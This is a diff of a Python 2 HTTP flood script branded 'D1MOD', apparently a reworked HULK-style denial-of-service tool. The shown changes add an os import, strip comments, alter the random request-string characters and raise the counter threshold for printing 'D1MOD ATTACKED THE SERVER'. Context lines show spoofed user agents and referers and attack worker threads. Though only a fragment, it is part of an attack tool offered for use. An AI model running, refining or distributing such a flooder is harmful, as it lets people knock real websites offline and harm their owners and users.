@@ -1,3 +1,4 @@
+import os
 import urllib2
 import sys
 import threading
@@ -25,7 +26,7 @@ def set_safe():
 	global safe
 	safe=1
 	
-# generates a user agent array
+
 def useragent_list():
 	global headers_useragents
 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
@@ -51,11 +52,11 @@ def referer_list():
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
 	
-#builds random ascii string
+
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
-		a = random.randint(65, 90)
+		a = random.randint(95, 165)
 		out_str += chr(a)
 	return(out_str)
 
@@ -141,18 +142,17 @@ class HTTPThread(threading.Thread):
 		except Exception, ex:
 			pass
 
-# monitors http threads and counts requests
 class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
+			if (previous+500<request_counter) & (previous<>request_counter):
 				print "%d D1MOD ATTACKED THE SERVER -->" % (request_counter)
 				previous=request_counter
 		if flag==2:
 			print "\n-- D1MOD Attack Finished --"
 
-#execute 
+
 if len(sys.argv) < 2:
 	usage()
 	sys.exit()
